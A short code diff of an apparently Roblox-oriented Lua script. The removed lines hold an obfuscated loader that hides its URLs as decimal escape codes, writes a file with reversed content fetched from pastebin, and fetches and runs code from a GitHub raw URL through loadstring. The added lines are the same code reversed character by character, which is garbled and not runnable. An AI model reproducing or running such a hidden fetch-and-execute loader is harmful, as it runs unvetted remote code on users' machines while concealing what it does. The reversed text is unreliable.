@@ -1,2 +1,3 @@
-local x12_9x82_32x_x222 = function(name,data)spawn(function()writefile(name, data)end)end
-x12_9x82_32x_x222("\65\117\116\111\51\70\97\114\109.\118\98\101\101",string.reverse(tostring(game:HttpGet('https://pastebin.com/raw/m6njXZRs', not false))))loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\113\117\97\100\114\97\100\111\114\47\79\80\76\47\109\97\105\110\47\65\84\70\46\108\117\97'))()
+
+)())'79\711\801\64\07\48\56\74\011\501\79\901\74\67\08\97\74\411\111\001\79\411\001\79\711\311\74\901\111\99\64\611\011\101\611\011\111\99\411\101\511\711\89\711\401\611\501\301\64\911\79\411\74\74\85\511\211\611\611\401\'(teGpttH:emag(gnirtsdaol))))eslaf ton ,'sRZXjn6m/war/moc.nibetsap//:sptth'(teGpttH:emag(gnirtsot(esrever.gnirts,"101\101\89\811\.901\411\79\07\15\111\611\711\56\"(222x_x23_28x9_21x
+dne)dne)atad ,eman(elifetirw)(noitcnuf(nwaps)atad,eman(noitcnuf = 222x_x23_28x9_21x lacol
